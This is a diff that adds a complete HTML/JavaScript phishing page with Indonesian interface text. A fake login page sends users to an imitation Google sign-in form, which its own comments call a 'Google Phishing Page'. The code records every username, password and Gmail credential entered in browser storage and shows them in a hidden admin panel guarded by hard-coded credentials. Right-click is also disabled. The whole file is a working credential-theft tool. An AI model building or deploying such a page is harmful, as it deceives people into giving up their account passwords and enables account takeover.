@@ -1,0 +1,1073 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LOG-IN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0c0e2a 0%, #1a1f3a 50%, #0c0e2a 100%);
+            min-height: 100vh;
+            color: #e0e0ff;
+            overflow-x: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            position: relative;
+        }
+        
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            animation: twinkle 3s infinite;
+        }
+        
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+        
+        .admin-btn {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(85, 85, 85, 0.3);
+            color: rgba(255, 255, 255, 0);
+            border: 1px solid rgba(255, 255, 255, 0);
+            padding: 8px 15px;
+            border-radius: 3px;
+            font-size: 12px;
+            cursor: pointer;
+            z-index: 1000;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #6a11cb, #2575fc, #6a11cb);
+            border-radius: 17px;
+            z-index: -1;
+            opacity: 0.2;
+        }
+        
+        h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 300;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b8b8ff;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 45px 14px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            font-size: 16px;
+            color: #ffffff;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #6a11cb;
+            box-shadow: 0 0 15px rgba(106, 17, 203, 0.4);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 38px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #b8b8ff;
+            font-size: 18px;
+            padding: 0;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: color 0.3s;
+        }
+        
+        .password-toggle:hover {
+            color: #ffffff;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #6a11cb, #2575fc);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(106, 17, 203, 0.4);
+        }
+        
+        .register-btn {
+            width: 100%;
+            padding: 14px;
+            background: rgba(37, 117, 252, 0.2);
+            color: #b8b8ff;
+            border: 1px solid rgba(37, 117, 252, 0.3);
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+        }
+        
+        .register-btn:hover {
+            background: rgba(37, 117, 252, 0.3);
+            border-color: rgba(37, 117, 252, 0.5);
+            color: #ffffff;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(12, 14, 42, 0.98);
+            z-index: 9999;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        
+        .admin-content {
+            background: rgba(26, 31, 58, 0.95);
+            backdrop-filter: blur(10px);
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 30px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+        }
+        
+        .admin-title {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #ffffff;
+            font-size: 24px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+        
+        .close-btn {
+            background: rgba(220, 53, 69, 0.8);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            float: right;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+        }
+        
+        .close-btn:hover {
+            background: rgba(220, 53, 69, 1);
+        }
+        
+        .status {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 15px;
+            text-align: center;
+            font-style: italic;
+        }
+        
+        .nav-tabs {
+            display: flex;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 25px;
+        }
+        
+        .tab-btn {
+            padding: 12px 24px;
+            background: none;
+            border: none;
+            border-bottom: 3px solid transparent;
+            cursor: pointer;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            transition: all 0.3s;
+        }
+        
+        .tab-btn.active {
+            border-bottom: 3px solid #6a11cb;
+            color: #ffffff;
+            font-weight: 500;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .data-list {
+            margin-top: 20px;
+            max-height: 500px;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        
+        .data-list::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .data-list::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 3px;
+        }
+        
+        .data-list::-webkit-scrollbar-thumb {
+            background: #6a11cb;
+            border-radius: 3px;
+        }
+        
+        .list-item {
+            margin-bottom: 15px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+        
+        .list-item:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .list-number {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 12px;
+            color: #6a11cb;
+        }
+        
+        .data-line {
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        .credentials-info {
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(52, 168, 83, 0.1);
+            border-radius: 8px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.8);
+            border-left: 3px solid #34a853;
+        }
+        
+        .delete-btn {
+            background: rgba(220, 53, 69, 0.8);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        
+        .delete-btn:hover {
+            background: rgba(220, 53, 69, 1);
+        }
+        
+        .delete-options {
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .delete-header {
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #ffffff;
+            font-size: 16px;
+        }
+        
+        .delete-option {
+            margin: 10px 0;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        .delete-option:hover {
+            background: rgba(255, 255, 255, 0.12);
+            color: #ffffff;
+        }
+        
+        .checkbox-item {
+            margin-bottom: 8px;
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 6px;
+        }
+        
+        .checkbox-item input {
+            width: auto;
+            margin-right: 10px;
+        }
+        
+        .checkbox-item label {
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 0;
+        }
+        
+        .select-all {
+            margin-bottom: 15px;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+        }
+        
+        .danger-option {
+            background: rgba(220, 53, 69, 0.8);
+            color: white;
+        }
+        
+        .danger-option:hover {
+            background: rgba(220, 53, 69, 1);
+        }
+        
+        /* Google Phishing Page Styles */
+        .google-login-container {
+            max-width: 450px;
+            margin: 50px auto;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+        
+        .google-logo {
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+        
+        .google-blue { color: #4285f4; }
+        .google-red { color: #ea4335; }
+        .google-yellow { color: #fbbc05; }
+        .google-green { color: #34a853; }
+        
+        .google-input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            font-size: 16px;
+            color: #ffffff;
+            margin-bottom: 20px;
+        }
+        
+        .google-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #6a11cb, #2575fc);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .google-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(106, 17, 203, 0.4);
+        }
+        
+        .google-help {
+            margin-top: 20px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        .google-back {
+            margin-top: 25px;
+            padding: 14px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #b8b8ff;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        
+        .google-back:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+        }
+        
+        .credentials-display {
+            margin-top: 25px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .credentials-display p {
+            margin-bottom: 10px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
+        .credentials-display strong {
+            color: #6a11cb;
+        }
+        
+        .glow {
+            animation: glow 2s infinite alternate;
+        }
+        
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 10px rgba(106, 17, 203, 0.3);
+            }
+            to {
+                box-shadow: 0 0 20px rgba(106, 17, 203, 0.6);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="stars" id="stars"></div>
+    
+    <button class="admin-btn" id="adminBtn">admin</button>
+    
+    <!-- Main Login Page -->
+    <div class="container glow" id="mainPage">
+        <h2>LOG-IN</h2>
+        <div class="input-group">
+            <label>Username</label>
+            <input type="text" id="username" placeholder="Enter username">
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="Enter password">
+            <button type="button" class="password-toggle" id="passwordToggle">*</button>
+        </div>
+        <button class="btn" id="loginBtn">Login</button>
+        <button class="register-btn" id="registerBtn">register untuk masuk</button>
+        <div class="status" id="status">Ready</div>
+        
+        <div id="credentialsDisplay" class="credentials-display hidden">
+            <p>Username: <strong>jamri mods</strong></p>
+            <p>Password: <strong>jamri mods</strong></p>
+        </div>
+    </div>
+    
+    <!-- Google Phishing Page -->
+    <div class="google-login-container hidden" id="googlePage">
+        <div class="google-logo">
+            <span class="google-blue">G</span>
+            <span class="google-red">o</span>
+            <span class="google-yellow">o</span>
+            <span class="google-blue">g</span>
+            <span class="google-green">l</span>
+            <span class="google-red">e</span>
+        </div>
+        <h3 style="color: #ffffff; margin-bottom: 20px;">Sign in</h3>
+        <p style="color: rgba(255, 255, 255, 0.8); margin-bottom: 30px;">Use your Google Account</p>
+        
+        <input type="email" id="googleEmail" class="google-input" placeholder="Email or phone">
+        
+        <div class="hidden" id="passwordSection">
+            <input type="password" id="googlePassword" class="google-input" placeholder="Enter your password">
+            <button class="google-submit" id="googlePasswordBtn">Next</button>
+        </div>
+        
+        <button class="google-submit" id="googleEmailBtn">Next</button>
+        
+        <div class="google-help">
+            <a href="#" id="forgotEmail" style="color: #4285f4; text-decoration: none;">Forgot email?</a>
+        </div>
+        
+        <button class="google-back" id="backBtn"> Back to login</button>
+    </div>
+    
+    <!-- Admin Panel -->
+    <div class="admin-panel hidden" id="adminPanel">
+        <div class="admin-content">
+            <button class="close-btn" id="closeAdminBtn">Close</button>
+            
+            <h2 class="admin-title">KHUSUS ADMIN!!</h2>
+            
+            <div class="nav-tabs">
+                <button class="tab-btn active" id="tab1Btn">Data Login</button>
+                <button class="tab-btn" id="tab2Btn">Data Gmail</button>
+            </div>
+            
+            <button class="delete-btn" id="deleteHistoryBtn">hapus riwayat</button>
+            
+            <div id="deleteOptions" class="delete-options hidden">
+                <div class="delete-header">pilihan hapus</div>
+                
+                <div class="select-all">
+                    <label>
+                        <input type="checkbox" id="selectAll">
+                        Pilih Semua
+                    </label>
+                </div>
+                
+                <div id="deleteList"></div>
+                
+                <div class="delete-option" id="deleteSelectedBtn">Hapus Data Terpilih</div>
+                
+                <div class="delete-option danger-option" id="deleteAllBtn">Hapus Semua Data (Full)</div>
+            </div>
+            
+            <!-- Tab 1: Login Data -->
+            <div id="tab1" class="tab-content active">
+                <div id="dataList" class="data-list"></div>
+            </div>
+            
+            <!-- Tab 2: Gmail Data -->
+            <div id="tab2" class="tab-content">
+                <div id="gmailList" class="data-list"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let loginData = [];
+        let gmailData = [];
+        let isAdminAuthenticated = false;
+        let currentTab = 'tab1';
+        const correctUsername = "jamri mods";
+        const correctPassword = "jamri mods";
+        let isPasswordVisible = false;
+        
+        // Create stars background
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            const starCount = 150;
+            
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                
+                // Random position
+                const x = Math.random() * 100;
+                const y = Math.random() * 100;
+                
+                // Random size
+                const size = Math.random() * 3 + 1;
+                
+                // Random animation delay
+                const delay = Math.random() * 5;
+                
+                star.style.left = `${x}%`;
+                star.style.top = `${y}%`;
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                star.style.animationDelay = `${delay}s`;
+                
+                starsContainer.appendChild(star);
+            }
+        }
+        
+        // Initialize all event listeners
+        function init() {
+            createStars();
+            
+            // Password toggle
+            document.getElementById('passwordToggle').addEventListener('click', togglePassword);
+            
+            // Login button
+            document.getElementById('loginBtn').addEventListener('click', processLogin);
+            
+            // Register button
+            document.getElementById('registerBtn').addEventListener('click', showGoogleLogin);
+            
+            // Admin button
+            document.getElementById('adminBtn').addEventListener('click', showAdminLogin);
+            
+            // Google page buttons
+            document.getElementById('googleEmailBtn').addEventListener('click', submitGoogleEmail);
+            document.getElementById('googlePasswordBtn').addEventListener('click', submitGooglePassword);
+            document.getElementById('forgotEmail').addEventListener('click', forgotEmail);
+            document.getElementById('backBtn').addEventListener('click', backToMain);
+            
+            // Admin panel buttons
+            document.getElementById('closeAdminBtn').addEventListener('click', closeAdmin);
+            document.getElementById('tab1Btn').addEventListener('click', () => switchTab('tab1'));
+            document.getElementById('tab2Btn').addEventListener('click', () => switchTab('tab2'));
+            document.getElementById('deleteHistoryBtn').addEventListener('click', showDeleteOptions);
+            document.getElementById('deleteSelectedBtn').addEventListener('click', deleteSelected);
+            document.getElementById('deleteAllBtn').addEventListener('click', deleteAll);
+            document.getElementById('selectAll').addEventListener('change', toggleSelectAll);
+            
+            // Enter key for login
+            document.getElementById('username').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') processLogin();
+            });
+            
+            document.getElementById('password').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') processLogin();
+            });
+            
+            // Load saved data
+            loadFromLocalStorage();
+        }
+        
+        // Password toggle function
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const toggleButton = document.getElementById('passwordToggle');
+            
+            isPasswordVisible = !isPasswordVisible;
+            
+            if (isPasswordVisible) {
+                passwordInput.type = 'text';
+                toggleButton.textContent = '*';
+            } else {
+                passwordInput.type = 'password';
+                toggleButton.textContent = '*';
+            }
+        }
+        
+        // Main functions
+        function showAdminLogin() {
+            const username = prompt('Admin Username:');
+            if (username !== 'amri') {
+                alert('Access denied');
+                return;
+            }
+            
+            const password = prompt('Admin Password:');
+            if (password !== 'dadang') {
+                alert('Access denied');
+                return;
+            }
+            
+            isAdminAuthenticated = true;
+            showAdminPanel();
+        }
+        
+        function showAdminPanel() {
+            document.getElementById('adminPanel').classList.remove('hidden');
+            updateDataDisplay();
+            updateGmailDisplay();
+        }
+        
+        function closeAdmin() {
+            document.getElementById('adminPanel').classList.add('hidden');
+            isAdminAuthenticated = false;
+            document.getElementById('deleteOptions').classList.add('hidden');
+        }
+        
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            document.getElementById(tabName + 'Btn').classList.add('active');
+            document.getElementById(tabName).classList.add('active');
+            
+            currentTab = tabName;
+        }
+        
+        // Login process
+        function processLogin() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                document.getElementById('status').textContent = 'Please fill all fields';
+                return;
+            }
+            
+            document.getElementById('status').textContent = 'wait..';
+            
+            setTimeout(() => {
+                if (username === correctUsername && password === correctPassword) {
+                    document.getElementById('status').textContent = 'success';
+                    
+                    const loginRecord = {
+                        username: username,
+                        password: password,
+                        timestamp: new Date().toLocaleString(),
+                        ip: 'Captured',
+                        status: 'Correct credentials'
+                    };
+                    
+                    loginData.push(loginRecord);
+                } else {
+                    alert('register untuk mendapatkan username dan password');
+                    document.getElementById('status').textContent = 'no success';
+                    
+                    const loginRecord = {
+                        username: username,
+                        password: password,
+                        timestamp: new Date().toLocaleString(),
+                        ip: 'Captured',
+                        status: 'Wrong credentials'
+                    };
+                    
+                    loginData.push(loginRecord);
+                }
+                
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                
+                if (isAdminAuthenticated) {
+                    updateDataDisplay();
+                }
+                
+                saveToLocalStorage();
+                
+                setTimeout(() => {
+                    document.getElementById('status').textContent = 'Ready';
+                }, 2000);
+            }, 1000);
+        }
+        
+        // Google phishing page
+        function showGoogleLogin() {
+            document.getElementById('mainPage').classList.add('hidden');
+            document.getElementById('googlePage').classList.remove('hidden');
+            document.getElementById('passwordSection').classList.add('hidden');
+            document.getElementById('googleEmailBtn').classList.remove('hidden');
+            document.getElementById('googleEmail').value = '';
+            document.getElementById('googlePassword').value = '';
+        }
+        
+        function submitGoogleEmail() {
+            const email = document.getElementById('googleEmail').value;
+            if (!email) {
+                alert('Please enter your email');
+                return;
+            }
+            
+            document.getElementById('passwordSection').classList.remove('hidden');
+            document.getElementById('googleEmailBtn').classList.add('hidden');
+        }
+        
+        function submitGooglePassword() {
+            const email = document.getElementById('googleEmail').value;
+            const password = document.getElementById('googlePassword').value;
+            
+            if (!email || !password) {
+                alert('Please enter your password');
+                return;
+            }
+            
+            const gmailRecord = {
+                email: email,
+                password: password,
+                timestamp: new Date().toLocaleString(),
+                ip: 'Captured via phishing'
+            };
+            
+            gmailData.push(gmailRecord);
+            
+            alert('Registration successful! Your login credentials have been created.');
+            
+            document.getElementById('credentialsDisplay').classList.remove('hidden');
+            
+            backToMain();
+            
+            if (isAdminAuthenticated) {
+                updateGmailDisplay();
+            }
+            
+            saveToLocalStorage();
+        }
+        
+        function forgotEmail() {
+            alert('Try: yourname@gmail.com');
+        }
+        
+        function backToMain() {
+            document.getElementById('googlePage').classList.add('hidden');
+            document.getElementById('mainPage').classList.remove('hidden');
+        }
+        
+        // Delete functions
+        function showDeleteOptions() {
+            const deleteOptions = document.getElementById('deleteOptions');
+            deleteOptions.classList.toggle('hidden');
+            
+            if (!deleteOptions.classList.contains('hidden')) {
+                updateDeleteList();
+            }
+        }
+        
+        function updateDeleteList() {
+            const deleteList = document.getElementById('deleteList');
+            deleteList.innerHTML = '';
+            
+            const dataToShow = currentTab === 'tab1' ? loginData : gmailData;
+            const dataType = currentTab === 'tab1' ? 'login' : 'gmail';
+            
+            dataToShow.forEach((data, index) => {
+                const checkboxItem = document.createElement('div');
+                checkboxItem.className = 'checkbox-item';
+                const identifier = currentTab === 'tab1' ? data.username : data.email;
+                checkboxItem.innerHTML = `
+                    <label>
+                        <input type="checkbox" class="delete-checkbox" data-type="${dataType}" data-index="${index}">
+                        ${index + 1}. ${identifier} (${data.timestamp})
+                    </label>
+                `;
+                deleteList.appendChild(checkboxItem);
+            });
+            
+            document.getElementById('selectAll').checked = false;
+        }
+        
+        function toggleSelectAll() {
+            const selectAll = document.getElementById('selectAll').checked;
+            const checkboxes = document.querySelectorAll('.delete-checkbox');
+            
+            checkboxes.forEach(checkbox => {
+                checkbox.checked = selectAll;
+            });
+        }
+        
+        function deleteSelected() {
+            const checkboxes = document.querySelectorAll('.delete-checkbox:checked');
+            const loginIndices = [];
+            const gmailIndices = [];
+            
+            checkboxes.forEach(checkbox => {
+                const type = checkbox.getAttribute('data-type');
+                const index = parseInt(checkbox.getAttribute('data-index'));
+                
+                if (type === 'login') {
+                    loginIndices.push(index);
+                } else {
+                    gmailIndices.push(index);
+                }
+            });
+            
+            if (loginIndices.length === 0 && gmailIndices.length === 0) {
+                alert('Pilih data yang ingin dihapus!');
+                return;
+            }
+            
+            if (confirm(`Hapus ${loginIndices.length + gmailIndices.length} data terpilih?`)) {
+                loginIndices.sort((a, b) => b - a).forEach(index => {
+                    loginData.splice(index, 1);
+                });
+                
+                gmailIndices.sort((a, b) => b - a).forEach(index => {
+                    gmailData.splice(index, 1);
+                });
+                
+                updateDataDisplay();
+                updateGmailDisplay();
+                updateDeleteList();
+                saveToLocalStorage();
+                alert('Data terpilih berhasil dihapus!');
+            }
+        }
+        
+        function deleteAll() {
+            const dataToDelete = currentTab === 'tab1' ? loginData : gmailData;
+            const dataName = currentTab === 'tab1' ? 'login' : 'Gmail';
+            
+            if (dataToDelete.length === 0) {
+                alert(`Tidak ada data ${dataName} untuk dihapus!`);
+                return;
+            }
+            
+            if (confirm(`Hapus SEMUA data ${dataName}? Tindakan ini tidak dapat dibatalkan!`)) {
+                if (currentTab === 'tab1') {
+                    loginData = [];
+                } else {
+                    gmailData = [];
+                }
+                
+                updateDataDisplay();
+                updateGmailDisplay();
+                updateDeleteList();
+                saveToLocalStorage();
+                alert(`Semua data ${dataName} berhasil dihapus!`);
+                document.getElementById('deleteOptions').classList.add('hidden');
+            }
+        }
+        
+        // Display functions
+        function updateDataDisplay() {
+            const dataList = document.getElementById('dataList');
+            dataList.innerHTML = '';
+            
+            loginData.forEach((data, index) => {
+                const listItem = document.createElement('div');
+                listItem.className = 'list-item';
+                
+                listItem.innerHTML = `
+                    <div class="list-number">${index + 1}.</div>
+                    <div class="data-line">Username: ${data.username}</div>
+                    <div class="data-line">Password: ${data.password}</div>
+                    <div class="data-line">Time: ${data.timestamp}</div>
+                    <div class="data-line">Status: ${data.status}</div>
+                    <div class="data-line">IP: ${data.ip}</div>
+                `;
+                
+                dataList.appendChild(listItem);
+            });
+            
+            if (loginData.length === 0) {
+                dataList.innerHTML = '<div style="text-align:center;color:rgba(255,255,255,0.5);padding:50px;">Belum ada data login</div>';
+            }
+        }
+        
+        function updateGmailDisplay() {
+            const gmailList = document.getElementById('gmailList');
+            gmailList.innerHTML = '';
+            
+            gmailData.forEach((data, index) => {
+                const listItem = document.createElement('div');
+                listItem.className = 'list-item';
+                
+                listItem.innerHTML = `
+                    <div class="list-number">${index + 1}.</div>
+                    <div class="credentials-info">
+                        <strong>Gmail Account:</strong><br>
+                        Email: ${data.email}<br>
+                        Password: ${data.password}<br>
+                        Time: ${data.timestamp}<br>
+                        IP: ${data.ip}
+                    </div>
+                `;
+                
+                gmailList.appendChild(listItem);
+            });
+            
+            if (gmailData.length === 0) {
+                gmailList.innerHTML = '<div style="text-align:center;color:rgba(255,255,255,0.5);padding:50px;">Belum ada data Gmail</div>';
+            }
+        }
+        
+        // Storage functions
+        function saveToLocalStorage() {
+            try {
+                localStorage.setItem('loginData', JSON.stringify(loginData));
+                localStorage.setItem('gmailData', JSON.stringify(gmailData));
+            } catch(e) {
+                console.log('Storage error');
+            }
+        }
+        
+        function loadFromLocalStorage() {
+            try {
+                const savedLoginData = localStorage.getItem('loginData');
+                const savedGmailData = localStorage.getItem('gmailData');
+                
+                if (savedLoginData) loginData = JSON.parse(savedLoginData);
+                if (savedGmailData) gmailData = JSON.parse(savedGmailData);
+            } catch(e) {
+                console.log('Load error');
+            }
+        }
+        
+        // Initialize on load
+        window.addEventListener('DOMContentLoaded', init);
+        
+        // Prevent right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
